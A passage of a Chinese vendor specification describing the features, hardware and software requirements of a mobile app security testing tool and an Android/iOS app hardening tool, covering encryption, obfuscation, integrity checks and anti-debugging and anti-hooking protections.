href="#APP自动化检测工具" class="headerlink" title="APP自动化检测工具"></a>APP自动化检测工具</h3><h4 id="工具概述-10"><a href="#工具概述-10" class="headerlink" title="工具概述"></a>工具概述</h4><p>APP自动化检测工具涵盖Android、iOS、Android SDK、微信公众号/小程序四大检测能力。通过深度静态代码检测，动态攻击验证双重驱动，提供源代码保护、数据存储、通信传输、安全防范等超百项检测能力，使用者可依据owasp mobile top 10、国家信息安全技术标准、行业检测规范要求，通过自动化检测+自主验证的方式，贴合用户实际业务场景，全面评估应用的安全问题，准确定位问题根源，呈现详细的安全问题详情。</p><h4 id="功能实施方案-59"><a href="#功能实施方案-59" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>功能参数如下：</p><p>提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLFAPPfnc</p><p>数量：1套</p><p>参数信息如下：</p><ol><li>提供license，包含数据库在内的功能。</li></ol><p>安卓应用检测</p><ol><li>支持全面检测安卓应用，通过高级算法能有效检测并评估应用对各类恶意攻击的防护能力。它能够详细识别应用的安全漏洞，确保安卓应用的防御机制充分健全。通过此工具，开发者可以预先发现并修补潜在的安全缺陷，从而大幅提高应用的整体安全性</li><li>支持检测移动应用程序的源文件可能面临的安全风险，通过对APK文件的逆向工程防护能力进行评估，以及检查混淆和加密措施的实施情况，确保源文件的安全性。此外，它还能识别那些可能被忽视的安全漏洞，包括移动应用的隐私数据被窃取或者破解、用户名或密码泄露、本地文件恶意读取等问题，比如硬编码的敏感信息、不安全的第三方库依赖以及潜在的代码漏洞，这些都可能成为攻击者利用的突破口。通过这些综合性的检测方法，帮助开发者提前发现和修复可能导致应用受到破解、信息泄露或被非法复制的风险，保护知识产权和用户的数据安全</li><li>支持检测移动应用本地数据存储可能面临的安全风险及漏洞，此类问题是应用程序本地数据面临的安全隐患，这类安全隐患对于移动应用来说尤为关键，因为它们直接关联到用户的隐私和敏感信息，包括个人身份详情、财务记录、登录凭据等。当这些数据在本地存储时，如果没有适当的加密和安全措施，就可能成为攻击者的目标，导致信息被非法访问、窃取或破解。工具通过模拟各种攻击场景，来检测应用对抗恶意软件和未授权访问的能力。它会评估应用程序的数据加密机制，检查敏感信息是否以安全的方式存储，比如使用强加密算法对用户名和密码进行保护。此外，它还会审查应用的权限设置，确保不会因权限过宽导致本地文件被恶意读取或更改</li><li>支持检测移动应用的通信数据传输中可能面临的安全隐患，不仅能识别通信过程中的潜在漏洞，还能对数据的保密性、传输的安全性以及数据收发双方的身份验证过程进行全面的检测和评估。这种全面性的检测尤为重要，因为数据在传输过程中若没有得到适当保护，就可能遭受截获、监听或篡改，从而导致敏感信息的泄露，工具的检测机制包括但不限于分析加密实施的强度，如SSL/TLS协议的使用情况，以及是否存在任何可能导致加密失败的配置错误。此外，它还会评估应用程序是否有适当的措施来保护密钥和证书不被泄露，以及是否有足够的措施来对抗常见的攻击</li><li>支持检测移动应用在身份认证过程中可能存在的关键信息泄露风险。这些风险可能导致身份认证界面被劫持或监视，输入信息被监听等安全问题。通过对身份认证机制的深入分析，工具帮助识别和防范这些风险，确保用户身份和认证过程的安全</li><li>支持检测移动应用内部数据在内部组件交互过程中可能面临的风险漏洞，该工具的设计专注于细致评估移动应用内部组件之间数据交互的安全性，以识别可工具的设计专注于细致评估移动应用内部组件之间数据交互的安全性，以识别可能导致数据泄露、越权访问或应用崩溃的风险漏洞。这款工具通过深入分析Intent的使用模式，确保所有组件交互都遵循最佳的安全实践。工具会检查应用是否有组件被错误地导出，这可能允许其他应用启动或与这些组件交互，造成潜在的安全威胁。它还会审查Intent过滤器配置，确保Intent消息只被预期的、正确的组件接收，阻止恶意应用利用这些Intent触发敏感操作。此外，工具对广播接收器的注册进行审查，以确定它们是否对意图的处理做适当的权限限制，从而防止敏感信息泄露或非法操作。通过这种全面的检测，开发者可以发现并解决那些可能被忽视的安全漏洞，从而防止应用程序在内部组件交互时出现数据泄露、越权访问和运行崩溃等问题</li><li>支持分析移动应用对于恶意攻击手段的防范能力，体现在应用代码设计、安全漏洞防范措施和是否应用保护技术等多个方面。分析不仅覆盖应用代码设计的安全性，还包括了安全漏洞防范措施的有效性，以及开发者是否在应用中应用先进的保护技术。通过这种多维度的检测，工具能够识别并指出那些可能被黑客利用的技术漏洞.该工具会模拟恶意代码注入攻击，检查应用是否容易受到此类攻击的影响；它还会尝试恶意代码的远程执行，以测试应用的远程防御能力；此外，针对拒绝服务攻击和不安全的文件执行等攻击手段，工具同样能够评估应用的抵抗力。通过这些模拟攻击，工具不仅能够揭示潜在的安全风险，还能为开发者提供针对发现的漏洞的具体修复建议。这样，开发者便可以及时采取措施，提升应用的安全性，确保用户数据的安全不被恶意攻击所侵犯</li><li>为了确保支持混合开发的App的安全性，工具提供了一项高效的自动化检测服务，专门针对那些部分功能由HTML5开发的Android应用。通过深入分析这些HTML5代码，工具能够精准识别出潜在的数据泄露风险和代码缺陷，确保应用中的Web内容同样符合最高的安全标准。这包括对本地存储机制、交互接口以及网页脚本的全面审查，以排查可能导致用户数据泄露或被恶意攻击的弱点。此外，工具还会评估应用中的身份验证机制，检查是否存在安全配置上的疏漏，从而为混合开发的App提供一层额外的安全保障。通过这些自动化的检测流程，开发者可以及时发现并修复安全隐患，提高应用的整体安全性</li><li>工具的安全检测功能特别强化对Android应用中集成的第三方SDK的审查能力。支持检测和识别移动应用中嵌入的各类SDK，能够提供这些SDK的详细信息，包括SDK的名称、开发者信息、包名、分类、来源及详细描述等。通过这项功能，开发者可以全面了解应用中所集成SDK的功能和潜在风险，确保第三方代码的安全性和合规性</li><li>工具提供的安全检测服务能够有效识别移动应用中的敏感词信息，支持开发者及时发现并处理应用内容中可能引起隐私泄露或不适宜的敏感词汇，确保应用内容的合规性和用户体验的安全性</li><li>工具针对移动应用的安全配置进行深入检测，能够评估并指出应用在权限管理、数据加密、通信安全等方面的配置不当之处，为开发者提供改进措施，确保应用的安全性得到加固</li></ol><p>IOS应用检测：</p><ol><li>工具支持全面检测应用行为，确保其符合安全规范，包括权限使用是否混乱、是否包含敏感内容，以及集成的第三方SDK是否安全，帮助开发者及时发现并修复潜在安全隐患</li><li>工具提供二进制代码安全检测功能，专注于分析应用是否采用代码混淆来抵御逆向工程，检查地址空间随机化（ASLR）技术的实施情况以阻止内存攻击，以及编译器堆栈保护技术的使用，以防止栈溢出等常见安全漏洞。通过这些检测，工具不仅能够帮助开发者识别出当前安全实践中的缺陷，还能提出具体的改进措施，从而提升应用的整体安全性能，确保用户数据和应用功能的安全不被破坏</li><li>工具深入分析应用客户端的数据存储安全，针对可能导致隐私数据泄露、用户名或密码等敏感信息暴露的风险进行严格检测。检测动态调试攻击，确保应用在运行时不易被恶意调试；同时监控输入监听行为，防止键盘记录器等恶意软件截获用户输入。此外，工具还会审查调试日志调用，避免敏感数据无意中被记录；并检查数据库存储实践，确保敏感信息不会以明文形式存储，从而降低被破解的风险。综合这些检测，该工具能够帮助开发者识别并修复应用中的客户端数据安全漏洞，加强数据保护，提升应用的整体安全性</li><li>支持检测移动应用的通信数据在传输中可能面临的安全隐患，从保密性、传输安全性以及数据收发双方的身份验证等多个维度进行深入分析。通过检测是否使用了强加密协议来保证数据在传输过程中不被窃听或篡改，确保通信双方的身份得到准确验证，防止身份冒充，工具能够有效预防敏感数据在传输中的泄露问题。此外，它还会评估SSL/TLS实现的正确性，检查证书验证、加密算法强度，以及端点验证等关键安全措施，从而为开发者提供全面的安全改进建议，增强移动应用的数据传输安全</li><li>支持检测移动应用的加密算法和密码安全隐患，针对加密算法和密码实践中的潜在弱点进行深度分析。支持对AES和DES等常用加密算法的安全性进行评估，确保这些算法得到正确实施，防止由于配置不当或使用过时算法导致的安全隐患。同时，工具会检测应用中是否采用了弱哈希算法，以及随机数生成器的安全性，确保敏感信息的加密过程不容易受到攻击。通过这些检测，工具能够帮助开发者识别和修复可能导致隐私数据泄露或加密文件被破解的安全问题，从而防止用户敏感信息的泄露，提高应用的整体安全性。</li><li>支持检测移动应用程序的源文件可能面临的安全风险，通过深入分析，识别那些可能导致代码被破解或文件信息泄露的弱点。工具监测应用源文件的保护措施，防止源代码暴露给不法分子，从而避免了程序信息被篡改和非法二次打包的风险。这样的安全审查对于保障用户数据安全和维护开发者的知识产权至关重要，帮助开发者及时发现并修补潜在的安全漏洞</li><li>为了确保支持混合开发的App的安全性，工具提供了一项高效的自动化检测服务，专门针对那些部分功能由HTML5开发的IOS应用。通过深入分析这些HTML5代码，工具能够精准识别出潜在的数据泄露风险和代码缺陷，确保应用中的Web内容同样符合最高的安全标准。这包括对本地存储机制、交互接口以及网页脚本的全面审查，以排查可能导致用户数据泄露或被恶意攻击的弱点。此外，工具还会评估应用中的身份验证机制，检查是否存在安全配置上的疏漏，从而为混合开发的App提供一层额外的安全保障。通过这些自动化的检测流程，开发者可以及时发现并修复安全隐患，提高应用的整体安全性</li><li>支持检测移动应用是否符合iOS应用安全规范，确保应用不包含不安全的API函数引用，没有受到XcodeGhost类恶意软件的感染，且正确使用了自动管理内存技术。它通过扫描代码库，识别并警告开发者有关潜在的安全隐患，帮助他们及时采取措施，提升应用的安全性能，确保最终用户的数据保护不受威胁</li><li>支持检测移动应用中集成的第三方SDK信息，它详细列出每个SDK的名称、开发者、包名、分类、来源和描述等关键信息，使开发者能够全面了解应用依赖的外部库。这有助于识别未经授权的SDK，防止潜在的安全风险，确保应用的安全合规性</li><li>工具提供的安全检测服务能够有效识别移动应用中的敏感词信息，支持开发者及时发现并处理应用内容中可能引起隐私泄露或不适宜的敏感词汇，确保应用内容的合规性和用户体验的安全性</li><li>提供license，包含数据库在内的功能。</li></ol><h4 id="技术实现内容-52"><a href="#技术实现内容-52" class="headerlink" title="技术实现内容"></a>技术实现内容</h4><h5 id="硬件方案-12"><a href="#硬件方案-12" class="headerlink" title="硬件方案"></a>硬件方案</h5><p>1. 硬件形态和便携性</p><p>紧凑设计：硬件应具备小巧的形态设计，便于携带，适合在不同的工作环境中使用。</p><p>轻量化材料：使用轻质材料制造外壳，减轻整体重量，增加便携性。</p><p>防护壳：提供坚固的外壳，保护硬件免受日常使用中的撞击和摔落。</p><p>2. 接口设备</p><p>多种I/O端口：至少包括USB-C、USB-A、HDMI、以太网端口，以及无线连接功能，如Wi-Fi和蓝牙，以便连接到各种设备和网络。</p><p>3. 硬件性能</p><p>高性能处理器：使用高性能的CPU，以支持复杂的安全检测算法和大量的数据处理。</p><p>大容量内存：至少16GB RAM以保证多任务和大型应用的流畅运行。</p><p>快速存储：内置高速SSD，至少512GB，以便快速读写大量数据。</p><p>高效冷却系统：设计高效的散热方案，确保长时间运行不过热。</p><p>4. 稳定性</p><p>操作系统稳定性：硬件应兼容主流操作系统，如Linux、Windows或macOS，这些操作系统已经过优化，以提高系统的稳定性和安全性。</p><p>冗余系统：关键组件如电源和存储应具备冗余设计，以防单点故障。</p><p>抗震动设计：内部组件应有固定和缓冲措施，以减少震动对硬件的影响。</p><p>备份和恢复：集成备份和恢复功能，确保在系统崩溃或硬件故障时能够快速恢复工作。</p><h5 id="软件方案-14"><a href="#软件方案-14" class="headerlink" title="软件方案"></a>软件方案</h5><p>1. 仪表盘和用户界面</p><p>用户登录/注册：安全的用户认证系统，允许用户创建账户并保护他们的个人信息。</p><p>实时仪表盘：展示当前分析状态、安全风险总览、最新发现的问题等关键信息。</p><p>报告生成：提供详细的安全分析报告，可供下载和分享，包含所有检测到的问题和推荐的修复措施。</p><p>2. 安卓和iOS应用安全检测</p><p>自动化扫描：上传应用后，工具自动开始扫描过程，分析应用的安全性。</p><p>恶意攻击防护能力检测：模拟各种攻击，检测应用的防护能力。</p><p>源文件和二进制代码安全检测：分析源文件和二进制代码的安全性，检查是否有安全漏洞。</p><p>本地数据存储安全检测：审查应用的本地数据存储实践，检测安全问题。</p><p>通信数据传输安全检测：评估数据传输过程中的加密和安全性。</p><p>身份认证和加密算法检测：检查身份认证流程和加密算法的安全性。</p><p>内部组件交互检测：分析内部组件的交互，检测潜在的安全风险。</p><p>混合开发App检测：针对混合开发的应用，检测HTML5代码的安全性。</p><p>第三方SDK和敏感词检测：分析集成的SDK和应用文本，检测安全和合规性问题。</p><p>安全配置检测：评估应用的安全配置设置。</p><p>3. 检测引擎和规则库</p><p>模块化检测引擎：设计为模块化结构，可以根据需要添加或更新检测规则。</p><p>规则库更新：定期更新规则库，包括最新的安全漏洞、攻击模式和合规性要求。</p><p>自定义规则：允许用户添加自定义检测规则，以适应特定的安全检测需求。</p><p>4. 集成和扩展性</p><p>API接口：提供API接口，允许集成到CI/CD流程中，实现自动化的安全检测。</p><p>插件支持：支持插件扩展，允许第三方开发者为工具提供额外的功能。</p><p>5. 安全和合规性</p><p>数据保护：确保所有上传的应用和生成的数据都得到安全的存储和传输。</p><p>合规性遵守：确保工具遵循相关的行业安全标准和法规要求。</p><h5 id="工具功能-14"><a href="#工具功能-14" class="headerlink" title="工具功能"></a>工具功能</h5><p>安卓应用检测</p><p>支持恶意攻击防护能力检测：该工具应能够模拟各种恶意攻击，如SQL注入、跨站脚本攻击（XSS）、跨站请求伪造（CSRF）等，并检测应用对这些攻击的防御能力。这包括但不限于检查输入验证、输出编码、错误处理、安全配置和会话管理等安全措施的实施情况。</p><p>支持源文件安全风险检测：工具需要能够分析APK文件的安全性，检测源代码是否易于被反编译，以及是否存在可能导致信息泄露或二次打包的安全弱点。这涉及到对代码混淆、加密字符串和资源文件的检查。</p><p>支持本地数据存储安全风险检测：检测应用是否将敏感数据（如用户凭据、个人信息等）存储在本地，并评估这些数据的存储方式是否安全。包括对SharedPreferences、SQLite数据库和文件存储的加密措施进行审查。</p><p>支持通信数据传输安全隐患检测：工具应评估应用是否使用了加密协议（如HTTPS、TLS等）来保护数据传输过程中的数据，并检查证书验证、加密算法和密钥管理等实践。</p><p>支持身份认证信息泄露风险检测：应用需要在登录和注册等身份认证环节保护用户凭据。工具应检查是否有明文传输、不安全的存储或易受攻击的认证流程存在。</p><p>支持内部组件交互风险漏洞检测：对于应用内部的组件（如活动、服务、广播接收器和内容提供者）的交互行为进行检测，确保没有过度的组件导出和不当的Intent使用，从而避免数据泄露和越权访问。</p><p>支持恶意攻击防范能力分析：该工具应分析应用的代码设计和安全漏洞防范措施，以及是否采用了保护技术，如代码混淆、运行时保护和反调试技术等。</p><p>支持混合开发App安全隐患检测：对于部分功能由HTML5开发的应用，需要检查Web视图的安全性，包括对JavaScript接口、本地存储和跨域资源共享（CORS）策略的审查。</p><p>支持第三方SDK信息检测：自动检测应用中集成的第三方SDK，包括其名称、开发者、包名、分类、来源和描述等，以及这些SDK是否有已知的安全问题或隐私泄露风险。</p><p>支持敏感词信息检测：扫描应用中的文本资源，检查是否包含敏感词或信息，涉及隐私、版权或其他合规问题。</p><p>支持安全配置检测：评估应用的安全配置，包括权限设置、网络配置、代码混淆设置等，确保应用的安全配置不会引入额外的风险。</p><p>iOS应用检测</p><p>支持应用行为安全规范检测：检查应用的行为是否符合苹果的安全规范，包括权限使用、敏感内容处理和第三方SDK的安全性。</p><p>支持二进制代码安全检测：分析应用的二进制代码，检查是否使用了代码混淆、地址空间布局随机化（ASLR）和编译器堆栈保护等技术。</p><p>支持客户端数据存储安全检测：评估应用对客户端数据的存储安全性，包括对动态调试攻击、输入监听和调试日志调用的防护措施。</p><p>支持通信数据传输安全隐患检测：与安卓应用检测相同，确保数据在传输过程中的保密性和安全性。</p><p>支持加密算法和密码安全隐患检测：检查应用使用的加密算法和密码安全措施，确保没有使用弱加密算法或不安全的随机数生成器。</p><p>支持源文件安全风险检测：与安卓应用检测相同，确保源文件的安全性。</p><p>支持混合开发App安全隐患检测：与安卓应用检测相同，检查HTML5部分的安全性。</p><p>支持是否符合iOS应用相关安全规范的检测：对iOS应用的API函数安全性检测，XcodeGhost相关或类似感染的安全性检测，自动管理内存技术未使用防护的安全性检测等。</p><p>支持第三方SDK信息检测：与安卓应用检测相同，检查第三方SDK的安全性。</p><p>支持敏感词信息检测：与安卓应用检测相同，扫描应用中的敏感词信息。</p><h3 id="APP加固工具"><a href="#APP加固工具" class="headerlink" title="APP加固工具"></a>APP加固工具</h3><h4 id="工具概述-11"><a href="#工具概述-11" class="headerlink" title="工具概述"></a>工具概述</h4><p>可以在不改变车机APP代码的情况下，将针对应用各种安全缺陷的保护技术集成到应用客户端内，为客户提供涵盖应用开发、打包、发布、运行全生命周期一体化安全保障服务，有效防止针对移动应用的反编译、二次打包、内存注入、动态调试、数据窃取、交易劫持、应用钓鱼等恶意攻击行为，全面保护应用软件安全。</p><h4 id="功能实施方案-60"><a href="#功能实施方案-60" class="headerlink" title="功能实施方案"></a>功能实施方案</h4><p>功能参数如下：</p><p>提供的该产品信息如下：</p><p>品牌：国利</p><p>型号：GLAPPloc</p><p>数量：1套</p><p>参数信息如下：</p><ol><li>本工具强化对加固壳内SO文件的保护，有效屏蔽第三方破解工具的分析能力，从而大幅提升应用的安全防护等级，防止破解行为</li><li>加固工具能够有效防止自动化工具的脱壳和绕过操作，通过采用加密算法和反自动化技术，确保壳不会被轻易绕过或脱壳，以保证APP的安全性，增强APP的安全性，从而增加对壳的保护强度。</li><li>加固工具能够对DEX文件进行整体加密和加壳保护，防止源代码被反编译和还原。同时，应采用先进的加密算法和反调试技术，防止静态调试分析，确保APP的安全性。防止反编译还原源代码，防止静态调试分析。</li><li>加固工具能够对DEX代码中的明文字符串进行加密保护，包括密钥、接口地址、敏感信息等。通过加密处理，确保这些信息不会被轻易窃取或被恶意利用，对DEX代码中的关键字符串，如密钥、API接口地址和敏感信息等进行加密，确保这些明文信息得到严格保护，防止泄露。</li><li>本工具精准对DEX文件内的类代码进行静态抽取与加密，确保源码在存储与传输过程中的安全性。其特色功能是在类代码被实际执行时才进行解密，有效避免恶意逆向工程，增强应用的防护层级</li><li>支持对DEX文件内的代码进行静态抽取，不仅如此，它还支持对DEX文件内的各个类代码进行精准的抽取加密。这种加密方式非常安全，因为加密后的类只有在被实际执行时才会进行解密，这大大提高了代码的安全性，有效防止了未授权访问和代码篡改。通过这样的机制，APP的保护层面得到了极大的增强</li><li>该工具APP的加固技术包含将DEX字节码转换为自定义的虚拟机操作码的能力，这意味着原本的DEX字节码不再以常规方式执行，而是通过专为该APP设计的自定义虚拟机来进行解释运行。这种转换为自定义操作码的方法大幅提升了代码的保密性和安全性，使得恶意分析工具难以直接应用于加固后的代码，有效防止了逆向工程和未授权篡改，为应用提供了一层额外的保护壁垒</li><li>APP加固工具提供了多种虚拟机和指令的复合保护技术，通过多套虚拟机选择最适合的虚拟机进行加固，使得可以实现多对多的自定义指令保护模式。复合保护技术结合了多种指令保护策略，如代码混淆、反调试、内存加密等，以增加攻击者的难度，可APP在运行时更加安全，并有效防止恶意攻击和逆向工程。</li><li>本工具提供最小细粒度的独立虚拟化保护，能够为每个函数设计独立的自定义指令集，确保每部分代码都拥有唯一操作码，大大提高了安全性。这一策略使得攻击者无法找到可持续利用的操作码，有效破坏了攻击链，增强了应用抵抗逆向工程和破解的能力。</li><li>该工具采用VMP保护技术，支持全范围函数的虚拟化保护，确保全部代码都得到加固，有效阻止静态分析和动态内存dump，极大提升了应用的安全防护能力</li><li>支持对多个DEX文件进行全面加固保护，增强应用防御力，抵御逆向和漏洞攻击。APP加固工具能够支持对多个DEX文件进行加固保护，确保APP的安全性和稳定性。通过对多个DEX文件的整体加密和加壳保护，防止反编译和篡改。</li><li>对移动应用中的SO文件执行深度加密和坚固加壳，极大增强了抗反编译能力。通过这种方式，它有效地防御了恶意破解和逆向分析的威胁，为应用提供一层额外的安全保障，确保核心算法和敏感数据得到充分保护，从而维护软件的安全性和知识产权</li><li>本工具能对SO文件内的字符串与函数表信息进行加密隐藏，可有效避免敏感信息泄露，提升应用的安全防护层级</li><li>本工具能使用加密技术对SO文件进行加密，并在运行时进行解密，隐藏SO文件的导入及导出函数，阻断IDA等工具的分析路径，为应用构筑更坚实的安全防线</li><li>本工具具备深度防护，可通过代码混淆、加密关键函数、反调试技术等对APP进行加固，以防止IDA查看SO伪代码（IDA F5功能），或通过逆向对APP进行调试分析，保障核心代码的安全</li><li>本工具采用SO动态加解密保护技术，确保在运行时动态地清除SO文件中的函数符号，避免敏感信息在内存中被恶意访问。应用运行结束后，该技术会对函数进行重新加密，从而有效防止对SO文件的dump攻击，保护应用不受未授权的内存读取和篡改，确保应用逻辑和数据的完整性与安全性</li><li>本工具支持将SO文件与应用程序绑定，确保SO文件专属性，有效防止SO文件被非法复制或盗用，增强应用的安全防护机制</li><li>本工具可对C#语言开发的Unity游戏提供加密服务，能够对核心DLL文件实施深层次的加密保护，有效阻止未授权访问和篡改，确保游戏逻辑的安全性，抵御外部攻击和逆向工程风险</li><li>本工具可对Lua语言开发的Cocos游戏提供加密服务，能够对核心lua脚本文件实施深层次的加密保护，通过高效算法对核心lua脚本文件加密，确保游戏逻辑与数据的安全性，抵御外部攻击和逆向工程风险</li><li>本工具能通过对APK内的每个文件进行哈希计算并存储生成的哈希值，然后在应用程序运行时重新计算哈希值并与存储的哈希值进行比对，以验证文件的完整性。通过强化校验过程、安全存储哈希值以及定期更新，可以有效地确保APK文件的完整性，确保其未遭篡改，有效防止恶意二次打包和分发，从而保障应用的原始性和安全性</li><li>本工具在APK运行时校验签名合法性，确保应用未被篡改或非法二次打包，有效维护APP的完整性与信任度，在APK运行时对其签名的合法性进行校验，确保APK的完整性和来源合法。通过校验签名，可以防止APK被篡改或二次打包，提高应用的安全性。</li><li>本工具对DEX文件实施完整性保护，加固工具能够对DEX文件进行完整性保护，防止被篡改。通过校验DEX文件的完整性，可以检测并阻止任何未经授权的修改，确保APP的安全性和稳定性，有效避免篡改，确保应用核心逻辑安全</li><li>该工具专注于对SO文件提供完整性保护，通过精准检测防止任何未授权的篡改行为，确保应用安全性，加固工具能够对SO文件进行完整性保护，防止被篡改。通过对SO文件的校验，确保其未被修改或替换，保证APP的安全性和稳定性。</li><li>本工具强化脚本文件的安全性，通过高效算法对脚本进行完整性保护，有效抵御外部篡改风险，确保应用稳定运行，加固工具能够对脚本文件进行完整性保护，防止被篡改。通过对脚本文件的校验，确保其未被修改或替换，保证APP的安全性和稳定性。</li><li>本工具新增支持对Android App Bundle（aab）文件的加固功能，aab格式是Android应用的一种分发格式，加固aab文件可以提高其安全性和稳定性，增强应用的安全性，抵御破解与逆向工程风险</li><li>本工具针对assets目录下的资源文件提供全面的完整性保护，确保它们不受篡改威胁，维护APP内容的原始性和安全性，加固工具能够对assets目录下的所有资源文件进行完整性保护，防止被篡改。assets目录通常包含重要的资源文件，如文本、图片等，对这些文件的保护可以确保APP的完整性和安全性。</li><li>该工具提供对res目录下所有资源文件的完整性保护服务，有效预防任何篡改行为，确保应用资源的完整性与安全，加固工具能够对res目录下的所有资源文件进行完整性保护，防止被篡改。res目录包含APP的主要资源文件，如布局、图片等，对这些文件的保护可以确保APP的完整性和安全性。</li><li>该工具有效支持对xml等配置文件进行完整性保护，确保关键配置不受篡改，保障应用的稳定性与安全性，加固工具能够支持对xml等配置文件进行完整性保护，防止被篡改。配置文件包含重要的设置和配置信息，对这些文件的保护可以确保APP的完整性和安全性。</li><li>本工具提供了强化功能，加固工具会对证书文件进行加密处理，使用对称或非对称加密算法对证书进行加密，再将加密后的证书文件嵌入到应用程序的资源或代码中，使其难以被直接访问和篡改，对存储在本地的证书文件实施完整性保护，有效防止任何形式的篡改行为，确保证书安全，证书文件用于验证应用程序的身份和来源，对这些文件的保护可以提高APP的安全性和可靠性。</li><li>本工具加固检测卓越，能防止使用调试技术或工具对应用执行内存动态调试，从而保护应用免受未授权访问，加固工具能够具备防止利用调试技术或工具对应用进行内存动态调试的功能。通过采用反调试技术，确保应用程序在运行过程中不会被轻易调试和分析，提高其安全性。</li><li>该工具能有效防止利用内存注入技术对应用进行恶意代码注入，确保应用运行环境的纯净与安全性</li><li>该工具强化安全防护，使用代码混淆技术，将应用程序的源代码进行重命名、重组和添加无效代码等操作，使得源代码难以被理解和还原，再使用加密技术对关键代码和敏感数据进行加密处理，确保在内存中存储的数据无法被直接读取和解密，有效防止通过内存dump手段获取应用源代码，确保应用的核心代码不被泄露</li><li>本工具增强对抗游戏外挂、应用修改器和变速器的能力，使用代码加密和混淆技术，使得应用程序的代码难以被恶意修改和篡改，以防止外挂程序通过修改应用程序的代码来实现作弊行为。使用反调试和反注入技术，检测和阻止调试器和注入器的运行，防止外挂程序或应用修改器通过调试和注入的方式对应用程序进行修改。有效防止任何形式的不正当干预，保障应用的公正性</li><li>本工具具备先进的防御机制，使用代码混淆技术，对应用程序的关键代码进行重命名和重组，使得使用Xposed工具进行Hook攻击者不能调试和分析应用程序的逻辑和结构。从而有效防止利用Xposed工具进行的Hook攻击，确保应用运行的安全性。</li><li>本工具具备先进的防御机制，使用代码混淆技术，对应用程序的关键代码进行重命名和重组，使得使用Cydia Substrate工具进行Hook攻击者不能调试和分析应用程序的逻辑和结构。从而有效防止利用Cydia Substrate工具进行的Hook攻击，确保应用运行的安全性。</li><li>本工具具备先进的防御机制，使用代码混淆技术，对应用程序的关键代码进行重命名和重组，使得使用Frida工具进行Hook攻击者不能调试和分析应用程序的逻辑和结构。从而有效防止利用Frida工具进行的Hook攻击，确保应用运行的安全性。</li><li>本工具支持对SQLITE等数据库文件实施透明加密，通过使用加密算法对SQLITE等数据库文件进行加密处理，将敏感数据转换为密文形式，防止未经授权的访问，提供强化的数据保护，防止未授权访问和数据泄露</li><li>本工具提供SharedPreferences数据文件的透明加密保护功能，通过使用加密算法对SharedPreferences数据进行加密处理，将敏感信息转换为密文形式，防止未经授权的访问，确保敏感配置信息的安全，防止数据被恶意读取和篡改</li><li>本工具支持对Webview相关数据文件实行透明加密保护，过使用加密算法对Webview数据进行加密处理，将敏感信息转换为密文形式，防止未经授权的访问，有效防止信息泄露，保障网页内容和用户数据的安全</li><li>本工具支持将加密后的数据文件与设备绑定，通过加密和绑定技术结合，有效防止文件的复用和盗用，确保应用数据的唯一性和安全性。</li><li>本工具通过扫描应用程序的资源文件，包括图片、音频、视频、布局文件等，并将这些资源文件进行抽取和提取，使用加密算法对这些资源文件进行整体加密处理，将其转换为密文形式，防止未经授权的访问和篡改，以此对所有资源文件进行抽取并实施整体加密，增强应用防篡改能力，确保资源文件的完整性和安全性。</li><li>本工具支持对assets资源文件实行透明加密保护，过使用加密算法对assets资源文件进行加密处理，将敏感信息转换为密文形式，防止未经授权的访问，有效防止信息泄露，保障网页内容和用户数据的安全</li><li>本工具支持对res资源文件实行透明加密保护，过使用加密算法对res资源文件进行加密处理，将敏感信息转换为密文形式，防止未经授权的访问，有效防止信息泄露，保障网页内容和用户数据的安全</li><li>本工具支持对配置文件实行透明加密保护，过使用加密算法对配置文件进行加密处理，将敏感信息转换为密文形式，防止未经授权的访问，有效防止信息泄露，保障网页内容和用户数据的安全</li><li>本工具支持对SSH等证书文实行透明加密保护，过使用加密算法对配SSH等证书文进行加密处理，将敏感信息转换为密文形式，防止未经授权的访问，有效防止信息泄露，保障网页内容和用户数据的安全</li><li>本工具通过控制流平坦化技术，通过对应用程序的代码进行分析，识别出程序的控制流结构，包括条件分支、循环和函数调用等，在保证程序原有语义不变的情况下，对控制流进行混淆处理，增强代码安全性。再对跳转逻辑的判断值进行隐藏，增加攻击者逆向分析的难度</li><li>本工具支持隐藏跳转逻辑的判断值，通过对判断值进行变量替换、常量替换或逻辑运算等操作，使得原始的判断值变得模糊或复杂，使得攻击者在进行逆向分析时需要经过更多的推理和分析，才能确定真实的判断条件和执行路径，以此来复杂化逆向分析流程，增加攻击者逆向分析的难度</li><li>该工具APP提供了强大的自定义规则功能，通过使用规则来确定需要混淆的范围，并对范围内的类名、方法名、函数名等进行自动混淆处理。工具根据预先设定的规则，对应用程序的代码进行分析和解析，以确定需要混淆的代码范围，规则可以包括指定特定的包名、类名、方法名等作为混淆的目标。在利用自身的一套算法或规则来生成新的、随机的名称，替代原始的名称，使代码的逻辑仍然保持完整，但对于攻击者来说，由于名称的混淆，理解代码的含义和功能变得更加困难。</li><li>本工具APP通过规则或配置文件确定需要加密的字符串范围，可以选择对整个应用程序或特定的代码模块、类、方法等进行加固。加密过程通常包括使用加密算法对字符串进行转换，将其转换为不可读的形式，以此对字符串进行加密，增强安全性。同时支持用户自定义加固范围选择，使用者可以自定义需要加过的字段、类、数据等，以这种灵活的方式应对不同的安全需求</li><li>该工具通过增设虚假控制分支，混淆真实逻辑，大幅提高了破解及分析原始控制流的复杂性，能够增加新的虚假控制分支，以加大破解和分析原始控制流的难度。通过引入虚假控制流，使得攻击者难以理解原始代码的逻辑和功能，从而提高APP的安全性和稳定性。</li><li>本工具引入随机性混淆代码，确保每次加固后的应用代码都独一无二，过引入随机因素，使得攻击者难以预测和识别代码的逻辑和结构，从而增加破解的难度和成本。</li><li>该工具通过检测和阻断GDB、LLDB等调试器，通过采用反调试技术，确保应用程序在运行过程中不会被轻易调试和分析，提高其安全性，有效避免了代码被动态调试和分析，从而增强了应用的安全防护</li><li>本工具防御Inline Hook，通过检测和防范Inline Hook攻击，确保应用程序不会被轻易篡改或劫持，提高其安全性和稳定性，禁止修改代码段和机器码，抵御如frida等工具的hook攻击，确保代码完整性</li><li>该加固工具可以对动态链接库（DLL）或框架进行签名验证，确保这些库或框架的完整性和真实性。通过验证签名，检测到外部关系的篡改，并阻止恶意的Hook攻击。通过对应用程序的代码进行混淆，使得Hook工具很难准确地定位和篡改关键函数或方法。在运行时的安全检测和监控机制，对应用程序的执行过程进行实时监测，检测异常行为和Hook攻击的迹象，并及时采取相应的防御措施，如终止被篡改的函数调用或重新加载被篡改的库。通过以上的防护措施，加固工具就能有效地防止通过Swizzling 